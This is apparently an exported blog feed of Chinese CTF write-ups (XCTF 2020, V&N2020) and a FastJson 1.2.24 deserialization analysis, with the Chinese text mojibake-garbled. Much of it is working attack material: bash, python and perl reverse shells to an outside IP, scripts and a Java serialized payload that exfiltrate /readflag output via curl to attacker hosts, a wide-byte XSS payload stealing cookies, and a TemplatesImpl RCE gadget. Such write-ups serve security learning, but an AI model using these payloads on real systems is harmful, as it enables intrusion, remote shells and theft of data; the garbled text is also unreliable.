$f_key=sprintf($cccc,$a,$b,$c,$d,$e,$f,$g,$h,$i,$j,$k,$l,$m,$n,$o,$p,$q,$r,$s); $key=base_convert($f_key,2,10); $result=decode_aes($key); if(stripos($result,\"guest\"))&#123; echo $result; echo $key.\"\\n\"; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125;&#125;function decode_aes($key)&#123; $ch=base64_decode(\"NGtWc0JCQ080dkNxcnhtVjVOSG1rQ3hWckRab3pjWkllTmdJMmovclR4YktzNk9FTERBSnYxSUNKVmQ4Qk55Qg==\"); $de = openssl_decrypt($ch,\"des-cbc\",$key,0,\"abcdabcd\"); return $de;&#125;?&gt; éå†å¾—åˆ°çš„keyå¼‚æˆ–è¿˜åŸå‡ºivï¼Œç„¶åå†å’Œhashæ¯”è¾ƒï¼Œæ‰¾å‡ºæ­£ç¡®çš„iv 12345678&lt;?php$key = strval(94675148);//æ¯æ¬¡ä¼šå˜$p = openssl_decrypt($cipher, 'des-cbc', $key, 0, $iv);print_r($p.\"&lt;br/&gt;\");$iv = \"\";for ($i = 0; $i &lt; 8; $i++) &#123;Â·//è¿˜åŸivå°±æ˜¯å’Œå¯†æ–‡å’Œç¬¬ä¸€ç»„æ˜æ–‡è¿›è¡Œå¼‚æˆ– $iv .= chr(ord($p[$i]) ^ ord($plain[$i]));&#125; éé¢„æœŸï¼šä½†æ˜¯å› ä¸ºè¿™é‡Œçš„ivå’Œkeyæ˜¯ä¿å­˜åœ¨sessionä¸­ï¼Œshanaå¸ˆå‚…ç›´æ¥åˆ é™¤sessionidï¼Œé‚£ä¹ˆå°±éƒ½ä¸ºç©ºäº† 1$sessionUser &#x3D; base64_encode(openssl_encrypt($user, &#39;des-cbc&#39;, &#39;&#39;, 0, &#39;&#39;)); ä¹‹åæ˜¯ä¸ªtomcatçš„PUTæ–¹æ³•ä¼ shellçš„æ¼æ´ï¼Œä¼ ä¸ªewä»£ç† =========================åˆ†å‰²çº¿ vpçš„wpè¿˜æœ‰å¦ä¸€ç§æ€è·¯ æµè§ˆé¢˜ç›®ï¼Œåˆæ­¥åˆ†ææ­¤å¤„ä¸º mt_rand ç‰¹æ€§ï¼Œç¬¬ä¸€æ¬¡è®¿é—®æ—¶å¯ä»¥æ‹¿åˆ° ç¬¬ä¸€æ¬¡ï¼Œç¬¬ 227ï¼Œ228 æ¬¡ç”Ÿæˆçš„éšæœºæ•°ï¼Œçˆ†ç ´éšæœºæ•°ç§å­ä¹‹åå¯ä»¥å¾—åˆ° ç¬¬ 229 ä¸ªéšæœºæ•°ï¼Œå¾—åˆ°å¯†é’¥ã€‚ dooogcmdæœ‰å¾ˆæ˜æ˜¾çš„é€»è¾‘æ¼æ´ï¼Œå¯ä»¥ç»•è¿‡å¯¹cmdçš„åˆ¤æ–­ 1234if int(time.time()) - data[&#39;timestamp&#39;] &lt; 60: if cmd not in [&#39;whoami&#39;, &#39;ls&#39;]: return &#39;cmd error&#39;... ç®€å•åˆ†æä¸‹æºç  åœ¨/getTGTä¸­ï¼Œç”¨(username + &#39;|&#39; + session_key + &#39;|&#39; + str(int(time.time())))ç”ŸæˆTGTçš„KEYæˆ‘ä»¬ä¸çŸ¥é“ï¼Œä½†æ˜¯çŸ¥é“åŠ å¯†ç»“æœTGTï¼Œç”¨session_keyç”Ÿæˆsession_key_encçš„KEYæˆ‘ä»¬æ˜¯æˆ‘ä»¬å¯æ§çš„master_keyï¼Œ åœ¨/getTicketä¸­ï¼Œ 123cryptor &#x3D; AESCipher(app.config.get(&#39;SECRET_KEY&#39;))auth_data &#x3D; cryptor.decrypt(base64.b64decode(TGT)).split(&#39;|&#39;)cryptor &#x3D; AESCipher(auth_data[1]) å‘ç°ç”Ÿæˆauthenticatorçš„KEYå°±æ˜¯session_keyï¼Œä¹‹åsession_key2ç”Ÿæˆclient_messageçš„KEYä¹Ÿæ˜¯session_keyï¼Œç”Ÿæˆserver_messageçš„KEYæ˜¯master_key æœ€åï¼Œ 1234client_message, server_message &#x3D; res.content.split(&#39;|&#39;)session_key &#x3D; cryptor.decrypt(base64.b64decode(client_message))cryptor &#x3D; AESCipher(session_key)authenticator &#x3D; base64.b64encode(cryptor.encrypt(username)) å¯¹authenticatorè¿›è¡ŒåŠ å¯†çš„KEYæ˜¯session_key2ã€‚ ç„¶åå°±å¯ä»¥å†™è„šæœ¬äº†ã€‚æŠ„ä¸€ä¸‹ä½œä¸š 12345678910111213141516171819202122232425from toolkit import AESCipherimport osimport requestsimport jsonimport timeimport base64import requestscryptor = AESCipher('00000000')authenticator = cryptor.encrypt(json.dumps(&#123;'username':'Q7','timestamp':int(time.time())&#125;))au = base64.b64encode(authenticator)print autgt = requests.post('http://121.37.164.32:5001/getTGT',data=&#123;'username':'Q7','authenticator': au&#125;).contentprint tgtsession_key, tgt = cryptor.decrypt(base64.b64decode(tgt.split('|')[0])), tgt.split('|')[1]cryptor = AESCipher(session_key)authenticator = base64.b64encode(cryptor.encrypt(json.dumps(&#123;'username': 'Q7','timestamp': int(time.time())-100&#125;)))res = requests.post('http://121.37.164.32:5001/getTicket', data=&#123;'username': 'Q7', 'authenticator': authenticator, 'TGT':tgt, 'cmd': '''curl q71998.cn:2333 -d `/readflag` '''&#125;).contentprint resclient_message, server_message = res.split('|')session_key = cryptor.decrypt(base64.b64decode(client_message))cryptor = AESCipher(session_key)authenticator = base64.b64encode(cryptor.encrypt(\"Q7\"))res = requests.post('http://121.37.164.32:5002/cmd',data=&#123;'server_message': server_message, 'authenticator':authenticator&#125;).contentprint res baby_javaxxeè¯»å–hint.txt ä¾èµ–ï§©æœ‰fastjsonï¼Œç‰ˆæœ¬ä¸º1.2.48ã€‚ã€‚ã€‚ è€Œprefixæ˜¯æƒ³è€ƒfastjsonä¼šè‡ªåŠ¨å¤„ï§¤ - å’Œ_ çš„ç‰¹æ€§ï¼Œåœ¨fastjsonä¸­ï¼Œ parseField è¿™ä¸ªå‡½æ•°ï§©ä¼šå»æ‰å­—ç¬¦ä¸²ä¸­çš„ - å’Œå¼€å¤´çš„ä¸‹åˆ’çº¿ï¼Œå› æ­¤å¸¦ä¸ª - å°±å¯ä»¥ï¦º happyvacationè¿˜æ²¡çœ‹é¢˜å°±è¢«é˜Ÿå‹ç§’äº†ğŸ¤¦â€â™‚ï¸ï¼Œ æœ‰ä¸ªéé¢„æœŸï¼Œåˆ©ç”¨ä¸‹é¢çš„å°†ä¸Šä¼ é»‘åå•ç½®ä¸ºfalseï¼Œä»è€Œä¸Šä¼ ä»»æ„åç¼€æ–‡ä»¶ 1eval(&quot;\\$this-&gt;&quot;.$answer.&quot; &#x3D; false;&quot;); æ§åˆ¶headerå¤´ï¼Œè®¾ç½®ä¸ºgbkï¼Œå¯ä»¥åˆ©ç”¨å®½å­—èŠ‚ä½¿å•å¼•å·é€ƒé€¸ã€‚ä»è€Œxsshttp://159.138.4.209:1002/quiz.php?referer=Content-Type: text/html; charset=GBK; Referer: index&amp;answer=user-&gt;url-&gt;pre payload: 1&#96;1%aa&#39;;var d&#x3D;String.fromCharCode(100,111,99,117,109,101,110,116);var c &#x3D;String.fromCharCode(99,111,111,107,105,101);var w&#x3D;String.fromCharCode(119,105,110,100,111,119);var o&#x3D;String.fromCharCode(111,112,101,110);var ip &#x3D; String.fromCharCode(47,47,52,55,46,50,52,48,46,52,56,46,52,50,58,50,51,51,51,47);self[w].open(ip%2bself[d][c]);&#x2F;&#x2F;&#96; hardphpç¬¬ä¸€æ­¥å»æ··æ·†ã€‚ easywebç”¨ä¸‹é¢çš„åŒ…èƒ½è¯»å–æ–‡ä»¶ï¼Œwpæ²¡è§£é‡Šã€‚ã€‚ã€‚ 1234567891011121314151617POST &#x2F;createmd?operate&#x3D;file&amp;isConvert&#x3D;true HTTP&#x2F;1.1Host: 121.36.222.22:801User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;62.0.3202.9 Safari&#x2F;537.36Accept: *&#x2F;*Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3Accept-Encoding: gzip, deflateContent-Type: text&#x2F;plainReferer: http:&#x2F;&#x2F;121.36.222.22:801&#x2F;profile.jspContent-Length: 39Cookie: JSESSIONID&#x3D;A33FFBFC70E5BF80F9D1E212F7C6402C;session_id&#x3D;7b0e89e7d9943a4581d96c705d3084537b12fceeX-Forwarded-For: 127.0.0.1Connection: close![](http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;profile.jsp) start.sh å†çœ‹åˆ° /home/tomcat/webapps/ROOT/WEB-INF/libs/ ä¸‹ Common Collections ä¸º 3.1ï¼Œæœ‰æ¼æ´ã€‚ å†æ ¹æ®é¢˜ç›®æç¤ºçš„ç«¯å£ 2078, ç„¶åå°±å¯ä»¥åœ¨æœ¬åœ°æ„é€ ä¸€ä¸ª RMI å®¢æˆ·ç«¯ï¼Œè°ƒç”¨ä¸Šé¢è¿™ä¸ªæ–¹æ³•ï¼Œå®æ–½ååºåˆ—åŒ–ã€‚ æ€»ç»“ï¼šåšé¢˜è¿˜æ˜¯å¾—æƒ³æƒ³è€ƒç‚¹æ˜¯å•¥ï¼Œä¸è¦ä¸€å‘³æ­»ç£•ã€‚ çŸ­æ¿è¿˜æ˜¯è¾£ä¹ˆå¤šã€‚ nepnepçš„å¸ˆå‚…ä»¬tqlğŸ‘… å‚è€ƒé“¾æ¥ https://wx.zsxq.com/dweb2/index/group/824215518412 https://mp.weixin.qq.com/s?__biz=MzU3ODc2NTg1OA==&amp;mid=2247484827&amp;idx=1&amp;sn=08a52b82dd04c37c17c08bcc85dc42de&amp;chksm=fd7110d6ca0699c02196923e2e95f77fbe5048dd023eba473fc391d7f97afde9f0bb7a6cdd93&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1583814055793&amp;sharer_shareid=0ed84c079a78a485e04fa50e826c0770#rd https://blog.de1ta.club/2020/03/10/XCTF%3CZHANYI%3E-2020/?nsukey=IRbrIReu2wgWelMKXIRg4GOxeF%2BLe8ryMZZza8bY%2B5UgrdvTaFVYAQQuqITVkIY%2F3qZZr53BXziZp0BnYjDfHN9KclyHbOpnuX%2F58pz3L1BhHsLZFkkkuhPAe67XBCpceGlpKo05X3R29J7qpnPi7I0QG7Vfn%2Fyrs2SCrbWEs%2F7mJImS4VdDc%2BLdt4vxOsgUV81pEMEh0mC5qAkz7Y92uA%3D%3D&amp;scene=2&amp;clicktime=1583836967&amp;enterid=1583836967&amp;from=timeline&amp;isappinstalled=0 https://mp.weixin.qq.com/s/RjTsvUsx65YTMIg3jejXng","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"V&N2020å…¬å¼€èµ›wp","slug":"V-N2020å…¬å¼€èµ›wp","date":"2020-03-02T14:06:02.000Z","updated":"2020-03-25T08:04:45.393Z","comments":true,"path":"2020/03/02/V-N2020å…¬å¼€èµ›wp/","link":"","permalink":"https://glotozz.github.io/2020/03/02/V-N2020%E5%85%AC%E5%BC%80%E8%B5%9Bwp/","excerpt":"å‰ä¸¤å¤©æ²¡æ‰“ï¼Œè¡¥ä¸€è¡¥ğŸ¤¦â€â™‚ï¸","text":"å‰ä¸¤å¤©æ²¡æ‰“ï¼Œè¡¥ä¸€è¡¥ğŸ¤¦â€â™‚ï¸ &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• Happy-CTFd CHECKIN TimeTravel EasySpringMVC å‚è€ƒé“¾æ¥ Happy-CTFdCTFdå‰äº›å¤©å‡ºçš„æ¼æ´ï¼Œæ³¨å†Œç”¨æˆ·æ—¶åˆ¤æ–­ç”¨æˆ·æ˜¯å¦å­˜åœ¨çš„æ—¶å€™æ²¡æœ‰å¯¹ä¸¤ç«¯ç©ºæ ¼è¿›è¡Œå¤„ç†ï¼Œè€Œæ’å…¥æ•°æ®åº“çš„æ—¶å€™å»é™¤äº†ä¸¤ç«¯çš„ç©ºæ ¼ã€‚å¼€ä¸ªéšç§çª—å£ä¸ºæ–°å¸æˆ·å¯åŠ¨å¯†ç é‡ç½®ï¼Œç”Ÿæˆçš„tokené“¾æ¥ä¸­å¯¹åº”äº†adminè´¦æˆ·ï¼Œæˆ‘ä»¬å…ˆä¿®æ”¹ç”¨æˆ·åä¸ºå…¶ä»–ï¼Œå†å»é‚®ç®±é‡ç½®adminå¸æˆ·çš„å¯†ç ã€‚ CHECKIN123456789101112131415161718192021222324252627from flask import Flask, requestimport osapp &#x3D; Flask(__name__)flag_file &#x3D; open(&quot;flag.txt&quot;, &quot;r&quot;)# flag &#x3D; flag_file.read()# flag_file.close()## @app.route(&#39;&#x2F;flag&#39;)# def flag():# return flag## want flag? naive!# You will never find the thing you want:) I think@app.route(&#39;&#x2F;shell&#39;)def shell(): os.system(&quot;rm -f flag.txt&quot;) exec_cmd &#x3D; request.args.get(&#39;c&#39;) os.system(exec_cmd) return &quot;1&quot;@app.route(&#39;&#x2F;&#39;)def source(): return open(&quot;app.py&quot;,&quot;r&quot;).read()if __name__ &#x3D;&#x3D; &quot;__main__&quot;: app.run(host&#x3D;&#39;0.0.0.0&#39;) emmmï¼Œå…¶å®å°±è€ƒäº†ä¸€ä¸ªçŸ¥è¯†ç‚¹ åœ¨ linux ç³»ç»Ÿä¸­å¦‚æœä¸€ä¸ªç¨‹åºæ‰“å¼€äº†ä¸€ä¸ªæ–‡ä»¶æ²¡æœ‰å…³é—­ï¼Œå³ä¾¿ä»å¤–éƒ¨ï¼ˆä¸Šæ–‡æ˜¯åˆ©ç”¨ rm -f flag.txtï¼‰åˆ é™¤ä¹‹åï¼Œåœ¨ /proc è¿™ä¸ªè¿›ç¨‹çš„ pid ç›®å½•ä¸‹çš„ fd æ–‡ä»¶æè¿°ç¬¦ç›®å½•ä¸‹è¿˜æ˜¯ä¼šæœ‰è¿™ä¸ªæ–‡ä»¶çš„ fdï¼Œé€šè¿‡è¿™ä¸ªæˆ‘ä»¬å³å¯å¾—åˆ°è¢«åˆ é™¤æ–‡ä»¶çš„å†…å®¹ã€‚ ç±»ä¼¼çš„è¿˜æœ‰/proc/xxx/ä¸‹çš„cwdæ˜¯è½¯é“¾æ¥ï¼Œselfè¡¨ç¤ºæœ¬è¿›ç¨‹ã€‚å½“æˆ‘ä»¬é€šè¿‡è®¿é—®Apacheè¿è¡Œçš„ç½‘ç«™æ—¶ï¼Œ/proc/self/cwd/å°±ç›¸å½“äºapacheçš„æ ¹ç›®å½• å¦‚æœæœ‰å›æ˜¾ï¼Œç›´æ¥cat /proc/*/fd/*å³å¯ï¼Œä½†æ˜¯æœ¬é¢˜æ²¡æœ‰å›æ˜¾ï¼Œéœ€è¦åå¼¹shellï¼Œè¿™é‡Œæä¾›3ä¸­åå¼¹æ–¹å¼ 1echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3NC4wLjIyMi4yMDMvMTIzNCAwPiYxCg&#x3D;&#x3D;|base64 -d|bash 1python3 -c &#39;mport socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;174.0.222.203&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&quot;&#x2F;bin&#x2F;sh&quot;,&quot;&quot;-i&quot;]);&#39; 1perl -MIO -e &#39;$p&#x3D;fork;exit,if($p);$c&#x3D;new IO::Socket::INET(PeerAddr,&quot;174.0.222.203:1234&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39; TimeTravel12345678910111213141516171819202122232425 &lt;?phperror_reporting(0);require __DIR__ . '/vendor/autoload.php';use GuzzleHttp\\Client;highlight_file(__FILE__);if(isset($_GET['flag'])) &#123; $client = new Client(); $response = $client-&gt;get('http://127.0.0.1:5000/api/eligible'); $content = $response-&gt;getBody(); $data = json_decode($content, TRUE); if($data['success'] === true) &#123; echo system('/readflag'); &#125;&#125;if(isset($_GET['file'])) &#123; highlight_file($_GET['file']);&#125;if(isset($_GET['phpinfo'])) &#123; phpinfo();&#125; å­˜åœ¨æ–‡ä»¶è¯»å–ï¼Œå°è¯•/start.sh å¼€å¯äº†php-fpmï¼Œhttp://127.0.0.1:5000/api/eligibleæœåŠ¡å°±æ˜¯è¿™ä¸ª/srv/app.pyæä¾›çš„ 123456789101112131415from flask import Flaskimport datetimeimport jsonapp = Flask(__name__)@app.route('/api/eligible')def source(): current_year = int(datetime.datetime.now().strftime(\"%Y\")) if current_year &lt; 2050: return json.dumps(&#123;\"success\": False&#125;) else: return json.dumps(&#123;\"success\": True&#125;)if __name__ == \"__main__\": app.run(host='127.0.0.1') ä»£ç æ²¡æœ‰æ¼æ´ï¼Œåªèƒ½åˆ©ç”¨ä¸­é—´ä»¶ HTTPoxyæ¼æ´ï¼ˆCVE-2016-5385ï¼‰ éœ€è¦è¿”å›çš„jsonæ•°æ®ä¸­ä¸ºTrueï¼Œå¯å¾—flag ä¼ å…¥ä¸€ä¸ª Proxyå¤´ï¼Œä½¿å…¶äº§ç”Ÿä¸€ä¸ª HTTP_PROXY ç¯å¢ƒå˜é‡ï¼Œè¿™ä¸ªç¯å¢ƒå˜é‡å†è¢«ç¨‹åºé‡Œçš„ GuzzleHttp ä½¿ç”¨ï¼Œå³å¯ä½¿æµé‡èµ°ä»£ç†ï¼Œæ§åˆ¶è¿”å›çš„è¯·æ±‚ã€‚ vpså¼€ä¸ªæœåŠ¡ï¼Œflaské»˜è®¤5000 1234567891011from flask import Flaskimport datetimeimport jsonapp = Flask(__name__)@app.route('/api/eligible')def source(): return json.dumps(&#123;\"success\": True&#125;)if __name__ == \"__main__\": app.run(host='127.0.0.1') æ·»åŠ  Proxy: http://174.0.222.203:5000 ä½†æ˜¯Linuxé¶æœºæ²¡flaskæ¨¡å—ï¼Œç”¨SimpleHTTPServeræ¨¡å— 1234567891011121314from http.server import BaseHTTPRequestHandler, HTTPServerimport jsonclass DemoHttpServer(BaseHTTPRequestHandler): def do_GET(self): self.send_response(200, message='OK') self.send_header('Content-Type', 'application/json') self.end_headers() self.wfile.write(json.dumps(&#123;\"success\": True&#125;).encode()) if __name__ == '__main__': server = HTTPServer(('0.0.0.0', 1234), DemoHttpServer) print('Server is running, user &lt;Ctrl+C&gt; to srop.') server.serve_forever() phpä¹Ÿå¯ï¼Œæ›´æ–¹ä¾¿ 123$arr &#x3D; array(&quot;success&quot;&#x3D;&gt;true);header(&quot;Content-Type:application&#x2F;json&quot;);echo json_encode($arr); å½“å‰ç›®å½•å¯åŠ¨php -S 0:2333 EasySpringMVCç»™äº†waråŒ…ï¼Œè§£å‹ï¼Œ toolsç›®å½•ä¸‹çš„ä¸¤ä¸ªç±»éƒ½å®ç°äº†Serializableï¼Œå…¶ä¸­Toolsç±»è¿˜å®šä¹‰äº†readObject()æ–¹æ³•ï¼Œåœ¨ååºåˆ—åŒ–æ—¶ä¼šè‡ªåŠ¨è§¦å‘ã€‚ ClientInfoç±»æ˜¯ç”¨æˆ·ä¿¡æ¯ç±»ã€‚ ClentInfoFilterç±»ä¸­å…ˆåˆ¤æ–­cookieä¸­æ˜¯å¦å­˜åœ¨cinfoå­—æ®µï¼Œ æ²¡æœ‰çš„è¯å®ä¾‹åŒ–ä¸€ä¸ªClientInfoï¼Œ 1cinfo &#x3D; new ClientInfo(&quot;Anonymous&quot;, &quot;normal&quot;, ((HttpServletRequest)request).getRequestedSessionId()); base64ç¼–ç ï¼Œè°ƒç”¨Tools.create()è¿›è¡Œåºåˆ—åŒ–ï¼Œå¹¶å­˜å…¥cookieã€‚å¦åˆ™è¿›è¡Œååºåˆ—åŒ– ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶cookieä»è€Œæ§åˆ¶ååºåˆ—åŒ–çš„ç±»ï¼Œè¿™é‡ŒreadObject()å·²ç»è¢«é‡å†™äº† 1(new ProcessBuilder((String[])((String[])obj))).start(); é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡é‡å†™Toolsç±»çš„writeObject()æ–¹æ³•ï¼Œè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ï¼Œä»è€Œå‘½ä»¤æ‰§è¡Œ payload 123456789101112131415161718192021222324252627package com.tools;import java.io.*;import java.util.Base64;public class Tools implements Serializable &#123; private static final long serialVersionUID = 1L; public static byte[] create(Object obj) throws Exception &#123; ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(bos); outputStream.writeObject(obj); return bos.toByteArray(); &#125; private void writeObject(ObjectOutputStream out) throws IOException &#123; String[] cmd = &#123;\"/bin/sh\",\"-c\",\"curl http://174.0.223.65:2333/`/readflag`\"&#125;; out.writeObject(cmd); &#125; public static void main(String[] args) throws Exception&#123; Base64.Encoder encoder = Base64.getEncoder(); Tools tools = new Tools(); byte[] bytes = Tools.create(tools); System.out.println(encoder.encodeToString(bytes)); &#125;&#125; 1rO0ABXNyAA9jb20udG9vbHMuVG9vbHMAAAAAAAAAAQMAAHhwdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAA3QABy9iaW4vc2h0AAItY3QAKWN1cmwgaHR0cDovLzE3NC4wLjIyMy42NToyMzMzL2AvcmVhZGZsYWdgeA&#x3D;&#x3D; ä¸€å¼€å§‹æˆ‘ä¸å°å¿ƒæŠŠä¸‹é¢çš„åˆ äº†ï¼Œå¯¼è‡´ä¸€ç›´å¤±è´¥ã€‚ private static final long serialVersionUID = 1L; æ·±å…¥äº†è§£åºåˆ—åŒ–writeObjectã€readObjectã€readResolve å‚è€ƒé“¾æ¥ https://www.zhaoj.in/read-6407.html?tdsourcetag=s_pctim_aiomsg https://cjm00n.top/2020/02/29/V-N%E5%85%AC%E5%BC%80%E8%B5%9B2020-writeup/?tdsourcetag=s_pctim_aiomsg","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"Javaååºåˆ—åŒ–æ¼æ´-FastJson1.2.24","slug":"Javaååºåˆ—åŒ–æ¼æ´-FastJson1.2.24","date":"2020-03-01T05:47:37.000Z","updated":"2020-03-25T08:06:04.258Z","comments":true,"path":"2020/03/01/Javaååºåˆ—åŒ–æ¼æ´-FastJson1.2.24/","link":"","permalink":"https://glotozz.github.io/2020/03/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-FastJson1.2.24/","excerpt":"ååºåˆ—åŒ–æ¼æ´ä¹Ÿæ˜¯Javaååºåˆ—åŒ–æ¼æ´ä¸­æ¯”è¾ƒç»å…¸çš„æ¼æ´","text":"ååºåˆ—åŒ–æ¼æ´ä¹Ÿæ˜¯Javaååºåˆ—åŒ–æ¼æ´ä¸­æ¯”è¾ƒç»å…¸çš„æ¼æ´ &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• FastJsonä»‹ç» æ¼æ´åˆ†æ POC æ€»ç»“ å‚è€ƒé“¾æ¥ FastJsonä»‹ç»ä¸‹è½½ 12345678910111213141516171819&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;project xmlns&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;POM&#x2F;4.0.0&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;POM&#x2F;4.0.0 http:&#x2F;&#x2F;maven.apache.org&#x2F;xsd&#x2F;maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;&#x2F;modelVersion&gt; &lt;groupId&gt;fastjson1224&lt;&#x2F;groupId&gt; &lt;artifactId&gt;test&lt;&#x2F;artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;&#x2F;version&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt; &lt;artifactId&gt;fastjson&lt;&#x2F;artifactId&gt; &lt;version&gt;1.2.24&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;&#x2F;dependencies&gt;&lt;&#x2F;project&gt; åºåˆ—åŒ– 1234567891011121314151617import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.serializer.SerializerFeature;public class FJTest &#123; public static void main(String[] args) &#123; Cat cat = new Cat(); cat.setName(\"gqy\"); //åºåˆ—åŒ– String json = JSON.toJSONString(cat); System.out.println(json); //è®¾ç½®SerializerFeature.WriteClassNameå¯å†™å…¥ç±»å String json1 = JSON.toJSONString(cat, SerializerFeature.WriteClassName); System.out.println(json1); //ååºåˆ—åŒ– System.out.println(JSON.parseObject(json1, Cat.class).getName()); &#125;&#125; æ³¨é‡Šæ‰setName()å’ŒsetAge() 12345String s &#x3D; &quot;&#123;\\&quot;@type\\&quot;:\\&quot;Cat\\&quot;,\\&quot;name\\&quot;:\\&quot;gqy\\&quot;&#125;&quot;;Cat cat1 &#x3D; JSON.parseObject(s, Cat.class);System.out.println(cat1.getName()); &#x2F;&#x2F;nullCat cat2 &#x3D; JSON.parseObject(s, Cat.class, Feature.SupportNonPublicField);System.out.println(cat2.getName()); &#x2F;&#x2F;gqy è®¾ç½®Feature.SupportNonPublicFieldå³å¯æ”¯æŒå¯¹è±¡ç±»çš„privateå±æ€§ æ–°åŠ ä¸€ä¸ªå±æ€§properties,è·Ÿè¸ªååºåˆ—åŒ– 12345678910111213141516171819202122232425import java.util.Properties;public class Cat &#123; private String name; private String age; private Properties properties; public String getName() &#123; return name; &#125; public Properties getProperties() &#123; System.out.println(\"getProperties\"); return properties; &#125; public String getAge() &#123; System.out.println(\"getAge\"); return age; &#125; public Cat() &#123; &#125;&#125; 12String s1 &#x3D; &quot;&#123;\\&quot;@type\\&quot;:\\&quot;Cat\\&quot;,\\&quot;name\\&quot;:\\&quot;gqy\\&quot;,\\&quot;properties\\&quot;:&#123;&#125;&#125;&quot;;Cat cat3 &#x3D; JSON.parseObject(s1, Cat.class, Feature.SupportNonPublicField); ç»“æœä¸º 12æ„é€ å‡½æ•°getProperties æ¼æ´åˆ†ææ¼æ´è§¦å‘ç‚¹ä¸º com.sun.org.apache.xalan.internal.xsltc.trax.Templatesï¼Œä½†æ˜¯è¿™ä¸ªåŒ…æˆ‘åœ¨fastjsonä¸­æ²¡æ‰¾åˆ°ï¼Œå´å¯ä»¥æ‰§è¡Œã€‚ å¯ä»¥å€ŸåŠ©ä¸‹é¢çš„ç½‘å€æŸ¥æ‰¾jar https://www.findjar.com/ åœ¨æˆ‘jdk1.8.0._112çš„jre/lib/rt.jarä¸­ï¼Œä¹Ÿæ·»åŠ åˆ°librariesä¸­å³å¯ æœç´¢getOutputProperties() è¿½è¸ªTransformer è¿½è¸ªgetTransletInstance() è¿™é‡Œæœ‰ä¸€ä¸ªå®ä¾‹åŒ–ç±»ï¼Œè¿½è¸ªdefineTransletClasses() ä»_bytecodeså±æ€§ä¸­åŠ è½½ç±»å¯¹è±¡ï¼Œå¹¶ä¸”ä¸Šä¸€æ­¥ä¸­è¦æ±‚è¿™ä¸ªå¯¹è±¡ç»§æ‰¿AbstractTranslet è¿½è¸ªABSTRACT_TRANSLETå¸¸é‡ä¸ºcom.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTransletå’Œå‰é¢çš„å¼ºåˆ¶ç±»è½¬åŒ–ç›¸ç…§åº” åˆ©ç”¨é“¾ 1234567891011JSON.parseObject...JavaBeanDeserializer.deserialze...FieldDeserializer.setValue...TemplatesImpl.getOutputPropertiesTemplatesImpl.newTransformerTemplatesImpl.getTransletInstance...Runtime.getRuntime().exec æ„é€ æˆ‘ä»¬éœ€è¦çš„å®ä¾‹åŒ–å¯¹è±¡ newInstance()ä¼šè‡ªåŠ¨æ‰§è¡Œæ— å‚æ„é€ æ–¹æ³• 123456789101112131415161718import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;public class Test extends AbstractTranslet &#123; public Test()&#123; Runtime.getRuntime().exec(\"calc\"); &#125; //ç»§æ‰¿AbstractTransletéœ€è¦é‡å†™ä¸‹é¢ä¸¤ä¸ªæ–¹æ³• public void transform(DOM dom, SerializationHandler[] serializationHandlers) throws TransletException &#123; &#125; public void transform(DOM dom, DTMAxisIterator dtmAxisIterator, SerializationHandler serializationHandler) throws TransletException &#123; &#125;&#125; fastjson-remote-code-execute-poc è¿˜æœ‰éœ€è¦æ³¨æ„çš„ä¸€ç‚¹ï¼Œä¸èƒ½å°†ç±»å¯¹è±¡ä»¥å­—ç¬¦æµçš„å½¢å¼ä¼ å…¥ï¼Œåœ¨JSONScannerä¸­å­˜åœ¨base64è§£ç  POC1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859package person;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.Feature;import com.alibaba.fastjson.parser.ParserConfig;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import org.apache.commons.io.IOUtils;import org.apache.commons.codec.binary.Base64;import java.io.ByteArrayOutputStream;import 